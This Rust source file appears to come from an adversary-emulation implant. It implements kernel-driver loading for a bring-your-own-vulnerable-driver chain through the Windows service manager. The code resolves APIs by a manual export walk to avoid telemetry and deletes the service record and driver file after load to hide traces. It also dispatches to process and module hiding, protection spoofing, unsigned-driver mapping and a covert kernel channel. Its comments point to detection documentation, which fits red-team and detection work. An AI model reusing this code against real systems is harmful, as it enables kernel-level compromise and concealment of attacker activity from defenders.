//! Kernel-driver staging lifecycle through the SCM (ABR-T013): copy a
//! driver file to a staging path, register a demand-start kernel service
//! on it, start it — or stop, deregister and delete it. Stage 3.1 of the
//! BYOVD chain: the mechanics are exercised against benign signed drivers
//! (e.g. a copy of `null.sys`) before any vulnerable driver is involved.
//!
//! Everything is resolved through the manual export walk
//! ([`syscalls::export_address`]) — no `GetProcAddress` telemetry — and
//! file I/O uses blocking `std::fs` on the session thread, the same
//! single-thread invariant the other task bodies honor (ABR-T011).
//!
//! The full footprint this leaves is deliberate detection material:
//! a service-install event (Sysmon EID 7045) whose `ImagePath` points
//! outside `System32\drivers`, a driver-load event (EID 6) for the
//! staged file, and a `Services` registry key with `Type=1` — see
//! `docs/detections/abr-t013.md`.

use std::ffi::c_void;

use crate::evasion::syscalls;

const SC_MANAGER_CREATE_SERVICE: u32 = 0x0002;
const SC_MANAGER_CONNECT: u32 = 0x0001;
const SERVICE_QUERY_STATUS: u32 = 0x0004;
const SERVICE_START: u32 = 0x0010;
const SERVICE_STOP: u32 = 0x0020;
const SERVICE_DELETE: u32 = 0x10000;
const SERVICE_KERNEL_DRIVER: u32 = 0x0000_0001;
const SERVICE_DEMAND_START: u32 = 0x0000_0003;
const SERVICE_ERROR_IGNORE: u32 = 0x0000_0000;
const SERVICE_CONTROL_STOP: u32 = 0x0000_0001;
const ERROR_SERVICE_ALREADY_RUNNING: u32 = 1056;
/// The driver image is already mapped in the kernel (observed when
/// staging a second copy of an image the system already loaded, e.g.
/// null.sys — the kernel deduplicates by image, not by path).
const ERROR_ALREADY_EXISTS: u32 = 183;
const ERROR_SERVICE_NOT_ACTIVE: u32 = 1062;

/// `SERVICE_STATUS` — the fixed-layout prefix Win32 APIs expect.
#[repr(C)]
struct ServiceStatus {
    service_type: u32,
    current_state: u32,
    controls_accepted: u32,
    win32_exit_code: u32,
    service_specific_exit_code: u32,
    check_point: u32,
    wait_hint: u32,
}

#[allow(non_snake_case)]
type OpenScManagerWFn = unsafe extern "system" fn(*const u16, *const u16, u32) -> *mut c_void;
#[allow(non_snake_case)]
type CreateServiceWFn = unsafe extern "system" fn(
    *mut c_void, // hSCManager
    *const u16,  // lpServiceName
    *const u16,  // lpDisplayName
    u32,         // dwDesiredAccess
    u32,         // dwServiceType
    u32,         // dwStartType
    u32,         // dwErrorControl
    *const u16,  // lpBinaryPathName
    *const u16,  // lpLoadOrderGroup
    *mut u32,    // lpdwTagId
    *const u16,  // lpDependencies
    *const u16,  // lpServiceStartName
    *const u16,  // lpPassword
) -> *mut c_void;
#[allow(non_snake_case)]
type OpenServiceWFn = unsafe extern "system" fn(*mut c_void, *const u16, u32) -> *mut c_void;
#[allow(non_snake_case)]
type StartServiceWFn = unsafe extern "system" fn(*mut c_void, u32, *const *const u16) -> i32;
#[allow(non_snake_case)]
type ControlServiceFn = unsafe extern "system" fn(*mut c_void, u32, *mut ServiceStatus) -> i32;
#[allow(non_snake_case)]
type QueryServiceStatusFn = unsafe extern "system" fn(*mut c_void, *mut ServiceStatus) -> i32;
#[allow(non_snake_case)]
type DeleteServiceFn = unsafe extern "system" fn(*mut c_void) -> i32;
#[allow(non_snake_case)]
type CloseServiceHandleFn = unsafe extern "system" fn(*mut c_void) -> i32;

fn resolve(name: &str) -> Result<usize, String> {
    // Forwarded advapi32 exports (→ sechost) are followed by the walk.
    unsafe { syscalls::export_address("advapi32.dll", name) }
        .ok_or_else(|| format!("{name} unresolved from advapi32"))
}

fn wide(value: &str) -> Vec<u16> {
    value.encode_utf16().chain(std::iter::once(0)).collect()
}

#[allow(non_snake_case)]
unsafe fn last_error() -> u32 {
    #[allow(non_snake_case)]
    extern "system" {
        fn GetLastError() -> u32;
    }
    unsafe { GetLastError() }
}

/// Entry point of the DRIVER task: dispatch on the action byte.
pub fn stage(action: u8, service: &str, source: &str, drop_path: &str) -> Result<Vec<u8>, String> {
    match action {
        abraham_common::message::driver_action::LOAD => load(service, source, drop_path),
        abraham_common::message::driver_action::UNLOAD => unload(service, drop_path),
        // The kernel-primitives probe needs no staging arguments — the
        // operator already loaded a vulnerable driver (ABR-T014).
        abraham_common::message::driver_action::PROBE => crate::vdm::probe_depth(source),
        // Arbitrary-write proof with restore-before-return (ABR-T015).
        abraham_common::message::driver_action::ELEVATE => crate::vdm::elevate(),
        // Capability survey + tier verdict (stage 3.5).
        abraham_common::message::driver_action::GATE => crate::vdm::gate(),
        // DKOM process hiding and its guarded restore (ABR-T016).
        abraham_common::message::driver_action::HIDE => crate::vdm::hide(),
        abraham_common::message::driver_action::UNHIDE => crate::vdm::unhide(),
        // Kernel-function-call proof on the call-capable driver (ABR-T017).
        abraham_common::message::driver_action::CALL => crate::vdm::kernel_call(),
        // Explicit safety gate after the read-only path also bugchecked.
        abraham_common::message::driver_action::CALL_PREFLIGHT => {
            crate::vdm::kernel_exec_preflight()
        }
        // KDMapper-style unsigned-driver mapping through iqvw64e
        // (ABR-T018); empty source maps the builtin proof payload.
        abraham_common::message::driver_action::MAP => crate::mapper::map_action(source),
        // Module DKOM on the loaded driver (ABR-T019).
        abraham_common::message::driver_action::MODHIDE => crate::vdm::modhide(source),
        abraham_common::message::driver_action::MODSHOW => crate::vdm::modshow(source),
        // EPROCESS.Protection spoof (ABR-T020); "off" restores.
        abraham_common::message::driver_action::PROTECT => {
            crate::vdm::protect(!source.eq_ignore_ascii_case("off"))
        }
        // Covert channel to the resident km payload (ABR-T021).
        abraham_common::message::driver_action::CHAN => crate::mapper::chan_action(source),
        other => Err(format!("unknown driver action {other:#04x}")),
    }
}

/// Copies `source` to `drop_path`, registers a demand-start kernel
/// service `service` on it and starts it.
fn load(service: &str, source: &str, drop_path: &str) -> Result<Vec<u8>, String> {
    if service.is_empty() || source.is_empty() || drop_path.is_empty() {
        return Err("driver load requires service, source and drop_path".into());
    }
    // Operator uploads may already sit at the final staging path —
    // copying a file onto itself would truncate it.
    let copied = if source.eq_ignore_ascii_case(drop_path) {
        std::fs::metadata(drop_path)
            .map(|m| m.len())
            .map_err(|e| format!("staged file {drop_path} missing: {e}"))?
    } else {
        std::fs::copy(source, drop_path)
            .map_err(|e| format!("copy {source} -> {drop_path} failed: {e}"))?
    };

    unsafe {
        let open_scm: OpenScManagerWFn = std::mem::transmute(resolve("OpenSCManagerW")?);
        let create_service: CreateServiceWFn = std::mem::transmute(resolve("CreateServiceW")?);
        let start_service: StartServiceWFn = std::mem::transmute(resolve("StartServiceW")?);
        let close: CloseServiceHandleFn = std::mem::transmute(resolve("CloseServiceHandle")?);

        let scm = open_scm(
            std::ptr::null(),
            std::ptr::null(),
            SC_MANAGER_CREATE_SERVICE,
        );
        if scm.is_null() {
            return Err(format!("OpenSCManagerW failed: {}", last_error()));
        }
        // NtLoadDriver consumes the ImagePath as an NT path; the \??\
        // prefix is the documented DOS-device form services accept.
        let image_path = format!(r"\??\{drop_path}");
        let svc = create_service(
            scm,
            wide(service).as_ptr(),
            std::ptr::null(), // display name defaults to the service name
            SERVICE_START | SERVICE_STOP | SERVICE_QUERY_STATUS | SERVICE_DELETE,
            SERVICE_KERNEL_DRIVER,
            SERVICE_DEMAND_START,
            SERVICE_ERROR_IGNORE,
            wide(&image_path).as_ptr(),
            std::ptr::null(),
            std::ptr::null_mut(),
            std::ptr::null(),
            std::ptr::null(),
            std::ptr::null(),
        );
        if svc.is_null() {
            let code = last_error();
            close(scm);
            return Err(format!("CreateServiceW({service}) failed: {code}"));
        }
        if start_service(svc, 0, std::ptr::null()) == 0 {
            let code = last_error();
            close(svc);
            close(scm);
            if code == ERROR_SERVICE_ALREADY_RUNNING || code == ERROR_ALREADY_EXISTS {
                return Ok(format!(
                    "{service}: driver image already active in the kernel ({copied} bytes staged at {drop_path})"
                )
                .into_bytes());
            }
            return Err(format!("StartServiceW({service}) failed: {code}"));
        }
        // Evasive teardown (KDMapper parity, ABR-T019 companion): the
        // image stays loaded and the device stays live, but the SCM
        // registration and the staged file are gone immediately -
        // `sc query`/Get-Service/registry show nothing after this. The
        // install itself still logged EID 7045 (irreducible telemetry,
        // docs/detections/abr-t013.md), and the load cannot be undone
        // without a reboot once deregistered.
        // Service exports mix suffixed and bare names - DeleteService has no W.
        let delete: DeleteServiceFn = std::mem::transmute(resolve("DeleteService")?);
        let deregistered = delete(svc) != 0;
        close(svc);
        close(scm);
        let file_removed = std::fs::remove_file(drop_path).is_ok();
        if deregistered {
            // DeleteService on a RUNNING driver only MARKS the record:
            // `sc query` keeps listing it until the image stops (live
            // nuance 2026-09-12). The staged file also stays sectioned
            // by the loaded image - both disappear at reboot.
            return Ok(format!(
                "{service}: serviceless load - started, registration marked for deletion (sc-query-visible until the driver stops; device live until reboot; staged file removal: {file_removed})"
            )
            .into_bytes());
        }
    }
    Ok(
        format!("{service}: kernel service created and started ({copied} bytes, {drop_path})")
            .into_bytes(),
    )
}

/// Stops the service if it is running, deletes its registration and
/// removes the staged file. A stop rejection from a kernel driver that
/// does not implement SERVICE_CONTROL_STOP is tolerated — deletion still
/// proceeds and the file is removed.
fn unload(service: &str, drop_path: &str) -> Result<Vec<u8>, String> {
    if service.is_empty() {
        return Err("driver unload requires service".into());
    }
    let mut notes: Vec<String> = Vec::new();
    unsafe {
        let open_scm: OpenScManagerWFn = std::mem::transmute(resolve("OpenSCManagerW")?);
        let open_service: OpenServiceWFn = std::mem::transmute(resolve("OpenServiceW")?);
        let control: ControlServiceFn = std::mem::transmute(resolve("ControlService")?);
        let query: QueryServiceStatusFn = std::mem::transmute(resolve("QueryServiceStatus")?);
        let delete: DeleteServiceFn = std::mem::transmute(resolve("DeleteService")?);
        let close: CloseServiceHandleFn = std::mem::transmute(resolve("CloseServiceHandle")?);

        let scm = open_scm(std::ptr::null(), std::ptr::null(), SC_MANAGER_CONNECT);
        if scm.is_null() {
            return Err(format!("OpenSCManagerW failed: {}", last_error()));
        }
        let svc = open_service(
            scm,
            wide(service).as_ptr(),
            SERVICE_STOP | SERVICE_QUERY_STATUS | SERVICE_DELETE,
        );
        if svc.is_null() {
            let code = last_error();
            close(scm);
            return Err(format!("OpenServiceW({service}) failed: {code}"));
        }
        let mut status = ServiceStatus {
            service_type: 0,
            current_state: 0,
            controls_accepted: 0,
            win32_exit_code: 0,
            service_specific_exit_code: 0,
            check_point: 0,
            wait_hint: 0,
        };
        if query(svc, &mut status) != 0 {
            notes.push(format!("state at unload: {}", status.current_state));
        }
        if status.current_state != 0 && status.current_state != 1 {
            // 1 = SERVICE_STOPPED; only send the control when running.
            let mut dummy = status;
            if control(svc, SERVICE_CONTROL_STOP, &mut dummy) == 0 {
                let code = last_error();
                if code != ERROR_SERVICE_NOT_ACTIVE {
                    notes.push(format!("stop control rejected: {code}"));
                }
            } else {
                notes.push("stopped".into());
            }
        }
        let deleted = delete(svc) != 0;
        // The registration is removed once the last handle closes.
        close(svc);
        close(scm);
        if !deleted {
            return Err(format!(
                "DeleteService({service}) failed: {} ({})",
                last_error(),
                notes.join("; ")
            ));
        }
    }
    if !drop_path.is_empty() {
        match std::fs::remove_file(drop_path) {
            Ok(()) => notes.push(format!("removed {drop_path}")),
            Err(e) if e.kind() == std::io::ErrorKind::NotFound => {}
            Err(e) => notes.push(format!("remove {drop_path} failed: {e}")),
        }
    }
    let mut message = format!("{service}: deregistered");
    if !notes.is_empty() {
        message.push_str(" (");
        message.push_str(&notes.join("; "));
        message.push(')');
    }
    Ok(message.into_bytes())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn scm_entrypoints_resolve() {
        // Host smoke: the advapi32 surface must resolve through the
        // manual walk (forwarders to sechost included). The lifecycle
        // itself needs an elevated context and runs as VM e2e instead.
        for name in [
            "OpenSCManagerW",
            "CreateServiceW",
            "OpenServiceW",
            "StartServiceW",
            "ControlService",
            "QueryServiceStatus",
            "DeleteService",
            "CloseServiceHandle",
        ] {
            assert!(resolve(name).is_ok(), "{name} did not resolve");
        }
    }

    #[test]
    fn load_rejects_empty_fields() {
        let err = load("", "src", "dst").unwrap_err();
        assert!(err.contains("requires"));
        let err = load("svc", "", "dst").unwrap_err();
        assert!(err.contains("requires"));
        let err = unload("", "dst").unwrap_err();
        assert!(err.contains("requires"));
    }

    #[test]
    fn unknown_action_is_rejected() {
        let err = stage(0xFF, "svc", "src", "dst").unwrap_err();
        assert!(err.contains("unknown driver action"));
    }

    #[test]
    fn call_preflight_is_fail_closed_before_any_driver_access() {
        let err = stage(
            abraham_common::message::driver_action::CALL_PREFLIGHT,
            "",
            "",
            "",
        )
        .unwrap_err();
        assert!(err.contains("disabled"));
        assert!(err.contains("no physical IOCTLs"));
    }
}
